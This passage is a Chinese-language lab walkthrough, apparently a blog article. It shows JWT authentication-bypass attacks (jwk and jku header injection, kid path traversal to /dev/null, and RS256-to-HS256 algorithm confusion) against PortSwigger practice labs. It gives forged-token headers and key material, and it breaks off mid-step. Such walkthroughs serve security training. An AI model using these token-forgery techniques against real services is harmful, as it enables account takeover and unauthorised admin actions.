这些用户可控制的参数每个都告诉接收方服务器在验证签名时应该使用哪个密钥，下面我们将介绍如何利用这些参数来注入使用您自己的任意密钥而不是服务器的密钥签名修改过的JWT

###### 注入场景1

下面我们介绍如何通过JWK参数注入自签名的JWT，JWS(JSON Web Signature)规范描述了一个可选的jwk header参数，服务器可以使用该参数以jwk格式将其公钥直接嵌入令牌本身，您可以在下面的JWT head中看到具体的示例:

```
{
    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
    }
}
```

理想情况下服务器应该只使用有限的公钥白名单来验证JWT签名，然而错误配置的服务器有时会使用jwk参数中嵌入的键值，您可以通过使用自己的RSA私钥对修改后的JWT进行签名，然后在jwk头中嵌入匹配的公钥来利用这种行为，Burpsuite的JWT Editor扩展提供了一个有用的功能来帮助您测试此漏洞，您可以在Burp中手动添加或修改JWT参数

靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection")

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-3563cc30-e07e-47f6-a2ab-8fee93f0ec95.png-w331s)

Step 1：点击"ACCESS THE LAB"访问靶场

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-f1ff7c39-3b98-4df4-ab75-b1ca9185b1dc.jpg-w331s)

Step 2：点击"My Account"登录系统

```
wiener:peter
```

![](https://images.seebug.org/content/images/2023/10/23/1698030426000-52609be1-31f6-4a27-ac1d-11054e914660.png-w331s)

Step 3：登录之后可以看到如下邮箱更新界面

![](https://images.seebug.org/content/images/2023/10/23/1698030427000-8b163327-5bee-4f59-9a10-698e80ee0ba6.png-w331s)

Step 4：下面我们开始操作，不过在此之前我们得先武器化以下自己，在Burpsuite界面选择"Extender"选项卡，紧接着点击"BApp Store"安装"JWT Editor"

![](https://images.seebug.org/content/images/2023/10/23/1698030427000-55d78122-322a-40e6-90b9-f4829ca58fcf.png-w331s)

之后你可以看到如下的选项卡界面

![](https://images.seebug.org/content/images/2023/10/23/1698030427000-91c26046-fd4f-4134-8a2d-80b88466f871.png-w331s)

Step 5：生成一个新的RSA密钥

```
{
    "p": "8J0fgpxQpZOvPGb2rRsJB6Bh0lgvxRtp_Ilc7NmpI3UgEUiArSey091pT3X6lIPRZLdMf_eeYo_PWh5aq79Ps_xoZHtAz4VrR9sR8tCkND-z0KKBmopkUrowJie368xoWDU53P-4qxEfCfqPPxoZZRzhE7cse0PUVayNAJC01FU",
    "kty": "RSA",
    "q": "1zMkdJNLYEdZYvZ31B15CmCfI9dOGEpn6lyXOEBPsqrP554x_8dXZnXSHbybiYyeLgl6i_JubJBqjeSAejwHh9v-e3-R9-7Dgg4lB_OUNqsg7yM3mcpZn7IHeGVKj9BjhigWsbUXFuwM1iEDK4TDmTV4-tO9UMsIBQA1SFlUTA8",
    "d": "Ayw2AASn_yn6EwjqCts6_gP6NZ9BlNhCG1iuDTX9h_AGWYBtUepdgp4CaM098ZyjH2Da3RvonFVlTOwHTgVAdkb2eWqeMejMjUji3cKIQRU_r0UeY3C4q8BBuWjwzF7ZTeVDgbx05NfeUW0LwWE3mFBuPDy6tmvYdekcs8Ft7GDmU_ToPZaGnMoEKzVlMyDb82LgkB7qWw2H4UoXHWR0l_RS90gTjkJzMc4Fmu4CoPfmqw8jLnGgq8GhAzpecc-VLvqel3tSY0fKqF5Y3U2SooL27vJJxX0kLgHVbcTNvCcS8XZArdhWTekV923jtspoNDYn5HfhAlLglCcwQcOSYQ",
    "e": "AQAB",
    "kid": "fa018615-0392-4d15-89bb-a2c637d9adbd",
    "qi": "XO3HEFj8PCxFz4DIw0djHjTrW4Krm-Oim-U4bmuEdmPDKKTIYYvkPVoSRR-4kCHkCx2aDsraUbNkTyEYC4dRUbnWl6xr2HxaLZIsxOglYsa939l_m6NXSzttAGrPpWqoURT7t6ihSmBnGDJDsMS3c1gWJKZsAYkeXy5lI2IhGks",
    "dp": "0gfldIZsY0w5_9jE5LAfvreCDDGMaVsXtihVpC4PVXMs7clDAWMQ152DCqiqdi9mfar_LQkCCXkM_9ZVQWw675qZqXRpS3xj_BI_ZZw4aZ9dn_XqefLpxcjetL-g7US9pJm5i67xDOpiFLzRg7yNhFSkKCiRvHumAq8fWen23w0",
    "dq": "QcZI6zSmAjxsjrnkcDm96DUWDv9cyEHdtx0rvy6w7VwWBaYthA8qoI98dEhUhdsr8chF44Zqx9XwK4Re3H2Ck7zi8F5SgCRDL3ohSWfisj7l5xGtidz2PcBNVjgnbQN1l-ii3xgJgaEOX1hhvqhqnGZins-e-pXD0rt4ja93-3M",
    "n": "ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w"
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030427000-9505509a-d16c-47a8-a2d2-07b3d5c57494.png-w331s)

Step 6：刷新页面拦截到请求并将请求发送到Repeat模块

![](https://images.seebug.org/content/images/2023/10/23/1698030427000-137a5978-6fba-4623-be3f-5073b6298c5a.png-w331s)

Step 7：在Repeat模块，我们切换到JSON Web Token选项卡，修改JWT的有效负载将sub内容修改为administrator

![](https://images.seebug.org/content/images/2023/10/23/1698030427000-774ec456-7ea7-49d7-8dea-422ddbd60d59.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030427000-7a7c9b63-625e-453e-89c8-155148819987.png-w331s)

Step 8：点击"Attack"，然后选择"Embedded JWK"，出现提示时选择您新生成的RSA密钥

![](https://images.seebug.org/content/images/2023/10/23/1698030428000-129de703-8e90-476c-ac6d-506161abe5e4.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030428000-6eb97b76-93b5-4356-b299-dee972792229.png-w331s)

Step 9：之后成功越权

![](https://images.seebug.org/content/images/2023/10/23/1698030428000-13b25996-17d5-446d-ba73-9027dbced817.png-w331s)

Step 10：调用敏感操作接口删除carlos用户完成解题

![](https://images.seebug.org/content/images/2023/10/23/1698030428000-47bbc487-aa19-4694-b26d-6346dacdccfb.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030428000-c4a4ff0b-3347-4896-997e-da0d7c9be722.png-w331s)

###### 注入场景2

有些服务器可以使用jku(jwk Set URL)头参数来引用包含密钥的JWK集，而不是直接使用JWK头参数来嵌入公钥，当验证签名时，服务器从这个URL获取相关的密钥，这里的JWK集其实是一个JSON对象，包含一个代表不同键的JWK数组，下面是一个简单的例子：

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

JWK集合有时会通过一个标准端点公开，比如:/.well-known/jwks.json，更安全的网站只会从受信任的域获取密钥，但有时您可以利用URL解析差异来绕过这种过滤，下面我们通过一个靶场来实践以下

靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection")

![](https://images.seebug.org/content/images/2023/10/23/1698030428000-fbb1af56-21df-4a8e-9978-92fd9173f12e.png-w331s)

Step 1：首先点击上方的"ACCESS THE LAB"选项卡进入实验环境

![](https://images.seebug.org/content/images/2023/10/23/1698030428000-b17e4c3e-b4e0-44f6-bfdd-28c6d2ba3386.jpg-w331s)

Step 2：登录系统

```
wiener:peter
```

![](https://images.seebug.org/content/images/2023/10/23/1698030428000-eec3a373-9255-451a-9d85-8444570e946b.png-w331s)

Step 3：随后你会看到一个用户邮箱更新的表单

![](https://images.seebug.org/content/images/2023/10/23/1698030429000-22063378-15b5-4016-887f-aa87165944f1.png-w331s)

Step 4：使用burpsuite生成一个新的RSA密钥

```
{
    "p": "8J0fgpxQpZOvPGb2rRsJB6Bh0lgvxRtp_Ilc7NmpI3UgEUiArSey091pT3X6lIPRZLdMf_eeYo_PWh5aq79Ps_xoZHtAz4VrR9sR8tCkND-z0KKBmopkUrowJie368xoWDU53P-4qxEfCfqPPxoZZRzhE7cse0PUVayNAJC01FU",
    "kty": "RSA",
    "q": "1zMkdJNLYEdZYvZ31B15CmCfI9dOGEpn6lyXOEBPsqrP554x_8dXZnXSHbybiYyeLgl6i_JubJBqjeSAejwHh9v-e3-R9-7Dgg4lB_OUNqsg7yM3mcpZn7IHeGVKj9BjhigWsbUXFuwM1iEDK4TDmTV4-tO9UMsIBQA1SFlUTA8",
    "d": "Ayw2AASn_yn6EwjqCts6_gP6NZ9BlNhCG1iuDTX9h_AGWYBtUepdgp4CaM098ZyjH2Da3RvonFVlTOwHTgVAdkb2eWqeMejMjUji3cKIQRU_r0UeY3C4q8BBuWjwzF7ZTeVDgbx05NfeUW0LwWE3mFBuPDy6tmvYdekcs8Ft7GDmU_ToPZaGnMoEKzVlMyDb82LgkB7qWw2H4UoXHWR0l_RS90gTjkJzMc4Fmu4CoPfmqw8jLnGgq8GhAzpecc-VLvqel3tSY0fKqF5Y3U2SooL27vJJxX0kLgHVbcTNvCcS8XZArdhWTekV923jtspoNDYn5HfhAlLglCcwQcOSYQ",
    "e": "AQAB",
    "kid": "fa018615-0392-4d15-89bb-a2c637d9adbd",
    "qi": "XO3HEFj8PCxFz4DIw0djHjTrW4Krm-Oim-U4bmuEdmPDKKTIYYvkPVoSRR-4kCHkCx2aDsraUbNkTyEYC4dRUbnWl6xr2HxaLZIsxOglYsa939l_m6NXSzttAGrPpWqoURT7t6ihSmBnGDJDsMS3c1gWJKZsAYkeXy5lI2IhGks",
    "dp": "0gfldIZsY0w5_9jE5LAfvreCDDGMaVsXtihVpC4PVXMs7clDAWMQ152DCqiqdi9mfar_LQkCCXkM_9ZVQWw675qZqXRpS3xj_BI_ZZw4aZ9dn_XqefLpxcjetL-g7US9pJm5i67xDOpiFLzRg7yNhFSkKCiRvHumAq8fWen23w0",
    "dq": "QcZI6zSmAjxsjrnkcDm96DUWDv9cyEHdtx0rvy6w7VwWBaYthA8qoI98dEhUhdsr8chF44Zqx9XwK4Re3H2Ck7zi8F5SgCRDL3ohSWfisj7l5xGtidz2PcBNVjgnbQN1l-ii3xgJgaEOX1hhvqhqnGZins-e-pXD0rt4ja93-3M",
    "n": "ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w"
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030427000-9505509a-d16c-47a8-a2d2-07b3d5c57494.png-w331s)

Step 5：发送请求到repeat

![](https://images.seebug.org/content/images/2023/10/23/1698030429000-c413b70d-13ae-41df-96ad-9b73f8ca18d1.png-w331s)

Step 6：复制公钥作为JWK

```
{
    "kty": "RSA",
    "e": "AQAB",
    "kid": "fa018615-0392-4d15-89bb-a2c637d9adbd",
    "n": "ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w"
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030429000-cc4e6ba0-0a23-4d50-b971-bf7f6518efef.png-w331s)

Step 7：在题目中选择"Go eo exploit server"，然后加上key头并保存到exploit的body中

```
{
   "keys": [
       {
           "kty": "RSA",
           "e": "AQAB",
           "kid": "fa018615-0392-4d15-89bb-a2c637d9adbd",
           "n": "ykQHB6Jelehm2eVfkb-2mSTpfODsGlthhS0sTLX5geGwsQCz4gnRbXPN5gOsCpqUbJH9gDE80q262XuS8DNrdmTLTPjuM4wRc-ghh9GvOCgJGBtO1PIVCTIsPmwhMra0eykwj246GReyoDcUhreG2yZ8rg-tHIcxPyWBtdKY2tubM6-YLk5gVLcuHRL25Fn_I5NghQbyzmISbulJ1CMq5WU-h9RA8IkYhVcrsP8Y1E2dc4fagKn5Tp60bUkjCcqIMAKouI-CX86mF0k3cSd340KuUXuf2vIo_yWMhZjFkAxj-gBn4eO3l2qZgyGkkHMn0HL8RSDzdG-BSBgNYoWs-w"
     }
    ]
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030429000-a5ef0aba-f73d-4397-a9e8-524897b94f2e.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030429000-f8f9a3ec-ca87-4371-87e5-5ed64501d0c8.png-w331s)

Step 8：然后切换至repeat的"JSON Web Token"界面，将kid修改成自己生成的JWK中的kid值，将jku的值改为exploit

![](https://images.seebug.org/content/images/2023/10/23/1698030429000-7ad8e66a-15aa-4326-bdff-2d7d41da6529.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030429000-96c582e0-f56b-4cd3-afef-d633b14e3973.png-w331s)

Step 9：切换sub为administrator

![](https://images.seebug.org/content/images/2023/10/23/1698030430000-72abb4cb-3b15-4e13-a62d-5e956b95cdec.png-w331s)

Step 10：点击下面的sign，选择Don’t modify header模式

![](https://images.seebug.org/content/images/2023/10/23/1698030430000-899f09c1-2bb7-4cad-a9d5-70f21da657a0.png-w331s)

Step 11：更改请求路径发送请求成功越权

![](https://images.seebug.org/content/images/2023/10/23/1698030430000-0fb62375-a1f1-4f83-aab0-efe544d67aee.png-w331s)

Step 12：请求敏感路径删除carlos用户

![](https://images.seebug.org/content/images/2023/10/23/1698030430000-6511900a-d1c3-4fb7-9b63-5b537ffca92b.png-w331s)

Step 13：成功解题

![](https://images.seebug.org/content/images/2023/10/23/1698030430000-69c0b318-a93a-4d89-aff7-51e12571d11a.png-w331s)

###### 注入场景3

服务器可能使用几个密钥来签署不同种类的数据，因此JWT的报头可能包含kid(密钥id)参数，这有助于服务器在验证签名时确定使用哪个密钥，验证密钥通常存储为一个JWK集，在这种情况下服务器可以简单地查找与令牌具有相同kid的JWK，然而JWS规范没有为这个ID定义具体的结构——它只是开发人员选择的任意字符串，例如:它们可能使用kid参数指向数据库中的特定条目，甚至是文件的名称，如果这个参数也容易受到目录遍历的攻击，攻击者可能会迫使服务器使用其文件系统中的任意文件作为验证密钥，例如：

```
{
    "kid": "../../path/to/file",
    "typ": "JWT",
    "alg": "HS256",
    "k": "asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc"
}
```

如果服务器也支持使用对称算法签名的jwt就会特别危险，在这种情况下攻击者可能会将kid参数指向一个可预测的静态文件，然后使用与该文件内容匹配的秘密对JWT进行签名，从理论上讲您可以对任何文件这样做，但是最简单的方法之一是使用/dev/null，这在大多数Linux系统上都存在，由于这是一个空文件，读取它将返回一个空字符串，因此用空字符串对令牌进行签名将会产生有效的签名

靶场地址：[https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal "https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal")

![](https://images.seebug.org/content/images/2023/10/23/1698030430000-1510c84e-b4a7-4f04-aae4-67a966c826e5.png-w331s)

Step 1：点击上方"Access The Lab"进入靶场

![](https://images.seebug.org/content/images/2023/10/23/1698030430000-5f285d3a-3323-4af2-9df2-f496d895d487.jpg-w331s)

Step 2：登录靶场

```
wiener:peter
```

![](https://images.seebug.org/content/images/2023/10/23/1698030430000-e60abd09-ab0f-4923-8649-32bb8d52376c.png-w331s)

Step 3：登录后进入到如下邮箱更新界面

![](https://images.seebug.org/content/images/2023/10/23/1698030431000-9a7cda52-5151-405f-b707-a4d0e1a0d616.png-w331s)

Step 4：使用burpsuite的插件生成一个对称密钥(Symmetric Key)并将k的值修改为"AA=="即为null

```
{
    "kty": "oct",
    "kid": "38576880-33b7-4446-ade4-f1a78bb6d5c2",
    "k": "AA=="
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030431000-e410be39-40ae-4297-b9e9-41b48c7338bf.png-w331s)

Step 5：拦截一个请求将其发送到repeat模块

![](https://images.seebug.org/content/images/2023/10/23/1698030431000-7859c485-3de3-4d1e-b3a8-eb83e897ac08.png-w331s)

Step 6：此时直接访问/admin——提示"401 Unauthorized"

![](https://images.seebug.org/content/images/2023/10/23/1698030431000-5d3ad3ba-26b4-4fa4-a810-20c9f77ce0a1.png-w331s)

Step 7：在JSON Web Token界面中修改kid值和sub进行目录遍历，这里的"/dev/null"文件名与"AA=="一致都为null，对称密钥，所以可以成功绕过

```
{
    "kid": "../../../../../../../dev/null",
    "alg": "HS256"
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030431000-09813d4e-e1a2-462a-a431-881a04e57b75.png-w331s)

Step 8：点击sign选择OCT8 的密钥攻击

![](https://images.seebug.org/content/images/2023/10/23/1698030431000-29abbc1e-e680-4be8-833a-2e8563052680.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030431000-194747c0-1aad-4986-b6c3-d30c01ff481e.png-w331s)

Step 9：成功越权

![](https://images.seebug.org/content/images/2023/10/23/1698030431000-83bdef69-eb9a-40ba-9fae-8584d86019a6.png-w331s)

Step 10：调用敏感接口删除carlos用户完成解题

![](https://images.seebug.org/content/images/2023/10/23/1698030432000-357b887b-b12c-4ca7-ba2f-163775746503.png-w331s)

![](https://images.seebug.org/content/images/2023/10/23/1698030432000-81bdd569-b87a-4b46-977b-b742733d8694.png-w331s)

##### JWT算法混淆

###### 算法混淆

算法混淆攻击(也称为密钥混淆攻击)是指攻击者能够迫使服务器使用不同于网站开发人员预期的算法来验证JSON web令牌(JWT)的签名，这种情况如果处理不当，攻击者可能会伪造包含任意值的有效jwt而无需知道服务器的秘密签名密钥

JWT可以使用一系列不同的算法进行签名，其中一些，例如:HS256(HMAC+SHA-256)使用"对称"密钥，这意味着服务器使用单个密钥对令牌进行签名和验证，显然这需要像密码一样保密

![](https://images.seebug.org/content/images/2023/10/23/1698030432000-c7b3227c-bdf7-4fb8-81e2-e8f85c17b398.jpg-w331s)

其他算法，例如:RS256(RSA+SHA-256)使用"非对称"密钥对，它由一个私钥和一个数学上相关的公钥组成，私钥用于服务器对令牌进行签名，公钥可用于验证签名，顾名思义，私钥必须保密，但公钥通常是共享的，这样任何人都可以验证服务器发出的令牌的签名

![](https://images.seebug.org/content/images/2023/10/23/1698030432000-444da96b-137e-4d5a-b147-45c085757e91.jpg-w331s)

###### 混淆攻击

算法混乱漏洞通常是由于JWT库的实现存在缺陷而导致的，尽管实际的验证过程因所使用的算法而异，但许多库都提供了一种与算法无关的方法来验证签名，这些方法依赖于令牌头中的alg参数来确定它们应该执行的验证类型，下面的伪代码显示了一个简单的示例，说明了这个泛型verify()方法在JWT库中的声明：

```
function verify(token, secretOrPublicKey){
    algorithm = token.getAlgHeader();
    if(algorithm == "RS256"){
           } else if (algorithm == "HS256"){
           }
}
```

使用这种方法的网站开发人员认为它将专门处理使用RS256这样的非对称算法签名的JWT时，问题就出现了，由于这个有缺陷的假设他们可能总是传递一个固定的公钥给方法，如下所示:

```
publicKey = <public-key-of-server>;
token = request.getCookie("session");
verify(token, publicKey);
```

在这种情况下，如果服务器接收到使用对称算法(例如:HS256)签名的令牌，库通用verify()方法会将公钥视为HMAC密钥，这意味着攻击者可以使用HS256和公钥对令牌进行签名，而服务器将使用相同的公钥来验证签名(备注:用于签署令牌的公钥必须与存储在服务器上的公钥完全相同，这包括使用相同的格式(如X.509 PEM)并保留任何非打印字符，例如:换行符,在实践中您可能需要尝试不同的格式才能使这种攻击奏效)

攻击流程简易视图如下：

![](https://images.seebug.org/content/images/2023/10/23/1698030432000-cc281833-046b-4935-95ce-a35a74068691.png-w331s)

###### 攻击演示

靶场地址：[https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion "https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion")

![](https://images.seebug.org/content/images/2023/10/23/1698030432000-f97cb650-93f1-4abd-89a9-b159b3354640.png-w331s)

Step 1：点击"Access the lab"访问靶场

![](https://images.seebug.org/content/images/2023/10/23/1698030432000-2cc0297b-5680-43df-b948-92b583c887f2.jpg-w331s)

Step 2：使用账户密码登录

```
wiener:peter
```

![](https://images.seebug.org/content/images/2023/10/23/1698030433000-04b70c7f-18c7-44dd-b1c8-6ad68fd3951c.png-w331s)

Step 3：登录之后进入到用户邮箱更新操作界面

![](https://images.seebug.org/content/images/2023/10/23/1698030433000-3de4d964-5e66-464e-82b9-e02c128f1b5a.png-w331s)

Step 4：服务器有时通过映射到/jwks.json或/.well-known/jwks.json的端点将它们的公钥公开为JSON Web Key(JWK)对象，比如大家熟知的/jwks.json，这些可能被存储在一个称为密钥的jwk数组中，这就是众所周知的JWK集合，即使密钥没有公开，您也可以从一对现有的jwt中提取它

```
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "75d0ef47-af89-47a9-9061-7c02a610d5ab",
            "n": "o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ"
        },
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA",
            "n": "fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw"
        }
    ]
}
```

于是乎我们可以直接访问/jwks.json接口获取到服务器的公钥信息，在此处我们将JWK复制下来，作为我们第二部的RSA Key

[https://0aad003404004c0b817dcff9004c0050.web-security-academy.net/jwks.json](https://0aad003404004c0b817dcff9004c0050.web-security-academy.net/jwks.json "https://0aad003404004c0b817dcff9004c0050.web-security-academy.net/jwks.json")

```
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "63624c36-bfd8-4146-888e-6d032ad4fe18",
      "alg": "RS256",
      "n": "zsiIsVqAKSpOnOxMKrI0hT3p8m_NK3VoejFnt4Hx2CFzvJsZ4_9mmoIVwi_nXYr7NtNV7stOSS4MGzYdJ57t4v83B9h7uI1fdKSp-L-cisg31S0Wm5B_LDnvuABFMcShJ-DKTgEYfLHaG31JudlyJdnfgNIIa0XL-wbGh7Xshf8RtzR8FC2DfApX_-KXYNnHxnTKTPXl5unBgCxyny2n2CwoCIiYet7s7X1c3qhwktWk6xJTmvkrd85KBlDSyEjBhEPPXrbVfqo8sNxkY-E2FXIoPIt8m_VSXlsKyZpjpfXTJJZo_IqazAl1XBW6bjwWjxwee0Xbyt7M1_1dTKjaAw"
    }
  ]
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030433000-33eb3522-964d-4103-aaa1-f307f9336788.png-w331s)

Step 5：在Burpsuite的JWT Editor Keys中点击"New RSA Key"，用之前泄露的JWK而生成一个新的RSA Key

```
{
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "63624c36-bfd8-4146-888e-6d032ad4fe18",
      "alg": "RS256",
      "n": "zsiIsVqAKSpOnOxMKrI0hT3p8m_NK3VoejFnt4Hx2CFzvJsZ4_9mmoIVwi_nXYr7NtNV7stOSS4MGzYdJ57t4v83B9h7uI1fdKSp-L-cisg31S0Wm5B_LDnvuABFMcShJ-DKTgEYfLHaG31JudlyJdnfgNIIa0XL-wbGh7Xshf8RtzR8FC2DfApX_-KXYNnHxnTKTPXl5unBgCxyny2n2CwoCIiYet7s7X1c3qhwktWk6xJTmvkrd85KBlDSyEjBhEPPXrbVfqo8sNxkY-E2FXIoPIt8m_VSXlsKyZpjpfXTJJZo_IqazAl1XBW6bjwWjxwee0Xbyt7M1_1dTKjaAw"
}
```

![](https://images.seebug.org/content/images/2023/10/23/1698030433000-d45e6874-fd17-4b4a-bbf3-d88e5ca08c47.png-w331s)

Step 6：选中"Copy Public Key as PEM"，同时将其进行base64编码操作，保存一下得到的字符串(备注:上下的一串-----END PUBLIC KEY-----不要删掉)

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzsiIsVqAKSpOnOxMKrI0
hT3p8m/NK3VoejFnt4Hx2CFzvJsZ4/9mmoIVwi/nXYr7NtNV7stOSS4MGzYdJ57t
4v83B9h7uI1fdKSp+L+cisg31S0Wm5B/LDnvuABFMcShJ+DKTgEYfLHaG31Judly
JdnfgNIIa0XL+wbGh7Xshf8RtzR8FC2DfApX/+KXYNnHxnTKTPXl5unBgCxyny2n
2CwoCIiYet7s7X1c3qhwktWk6xJTmvkrd85KBlDSyEjBhEPPXrbVfqo8sNxkY+E2
FXIoPIt8m/VSXlsKyZpjpfXTJJZo/IqazAl1XBW6bjwWjxwee0Xbyt7M1/1dTKja
AwIDAQAB
-----END PUBLIC KEY-----
```

![](https://images.seebug.org/content/images/2023/10/600cd101-abea-460b-8989-7504e60a4ac2.png-w331s)

base64后结果：

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6c2lJc1ZxQUtTcE9uT3hNS3JJMApoVDNwOG0vTkszVm9lakZudDRIeDJDRnp2SnNaNC85bW1vSVZ3aS9uWFlyN050TlY3c3RPU1M0TUd6WWRKNTd0CjR2ODNCOWg3dUkxZmRLU3ArTCtjaXNnMzFTMFdtNUIvTERudnVBQkZNY1NoSitES1RnRVlmTEhhRzMxSnVkbHkKSmRuZmdOSUlhMFhMK3diR2g3WHNoZjhSdHpSOEZDMkRmQXBYLytLWFlObkh4blRLVFBYbDV1bkJnQ3h5bnkybgoyQ3dvQ0lpWWV0N3M3WDFjM3Fod2t0V2s2eEpUbXZrcmQ4NUtCbERTeUVqQmhFUFBYcmJWZnFvOHNOeGtZK0UyCkZYSW9QSXQ4bS9WU1hsc0t5WnBqcGZYVEpKWm8vSXFhekFsMVhCVzZiandXanh3ZWUwWGJ5dDdNMS8xZFRLamEKQXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```

![](https://images.seebug.org/content/images/2023/10/23/1698030433000-9febe885-ac19-43d5-92c1-474646682427.png-w331s)

Step 7：在JWT Editor Keys处，生成新的对称加密Key，用之前保存的base64编码去替换k的值

```
{
    "kty": "oct",
    "kid": "63b7b785-4d35-4cb7-bbc6-9d9e17dcf5fe",
